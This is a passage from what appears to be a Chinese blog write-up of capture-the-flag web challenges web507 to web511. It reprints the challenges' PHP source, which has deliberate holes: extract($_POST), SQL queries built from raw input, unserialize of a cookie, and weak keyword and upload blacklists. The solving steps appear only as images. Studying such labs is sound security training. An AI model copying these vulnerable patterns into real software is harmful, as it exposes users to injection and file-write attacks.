class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment"># code...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次对文件上传进行了过滤</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130230633.png" alt="image-20220414130230633"></p><p>从这里传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130410885.png" alt="image-20220414130410885"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130450436.png" alt="image-20220414130450436"></p><h1 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h1><p>api&#x2F;admin_edit.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>]=<span class="variable">$nickname</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;avatar&#x27;</span>]=<span class="variable">$avatar</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可见这里并没有将图片放到本地,而是放到了session里面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131751499.png" alt="image-20220414131751499"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131808105.png" alt="image-20220414131808105"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414132009224.png" alt="image-20220414132009224"></p><h1 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133327832.png" alt="image-20220414133327832"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133433745.png" alt="image-20220414133433745"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133503550.png" alt="image-20220414133503550"></p><h1 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133936922.png" alt="image-20220414133936922"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134023254.png" alt="image-20220414134023254"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134049496.png" alt="image-20220414134049496"></p><h1 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h1><p>&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 16:43:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\:|\,/&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;check&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|or|innodb|sys|mysql/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,nickname,avatar from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$user</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=index&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;clear&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;view&#x27;</span>:</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>],<span class="variable">$user</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;logout&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>api&#x2F;admin_templates.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-19 18:49:54</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-25 17:17:07</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$user</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,name,type,path,des from templates limit 0,10&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="variable">$temps</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_array</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="title function_ invoke__">count</span>(<span class="variable">$temps</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="variable">$temps</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$row</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$row</span>))&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;update templates set name=&#x27;<span class="subst">&#123;$row-&gt;name&#125;</span>&#x27;,path=&#x27;<span class="subst">&#123;$row-&gt;path&#125;</span>&#x27;,type=&#x27;<span class="subst">&#123;$row-&gt;type&#125;</span>&#x27;,des=&#x27;<span class="subst">&#123;$row-&gt;des&#125;</span>&#x27; where id =<span class="subst">&#123;$row-&gt;id&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">update_one</span>(<span class="variable">$sql</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新成功&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;实时更新失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;getContents&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$template</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$template</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$template</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;count&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;contents&#x27;</span>=&gt;<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$template</span>-&gt;path)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;download&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$path</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition:  attachment; filename=&quot;&#x27;</span> . <span class="variable">$path</span>. <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$path</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|phar|ini|settings/i&#x27;</span>, <span class="variable">$name</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#x27;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../templates/&#x27;</span>.<span class="variable">$name</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;文件上传失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment"># code...</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$row</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;name))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;type))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;des))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;path))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#x27;</span>, <span class="variable">$row</span>-&gt;id))&#123;</span><br><span class="line"><span class="variable">$ret</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>api&#x2F;admin_edit.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-15 04:27:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-15 07:45:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;../render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line"><span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|\&quot;|\\\/&#x27;</span>, <span class="variable">$avatar</span>))&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;存在无效字符&#x27;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set nickname=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$nickname</span>, <span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;,avatar=&#x27;&quot;</span>.<span class="variable">$avatar</span>.<span class="string">&quot;&#x27; where username=&#x27;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>],<span class="number">0</span>,<span class="number">8</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span 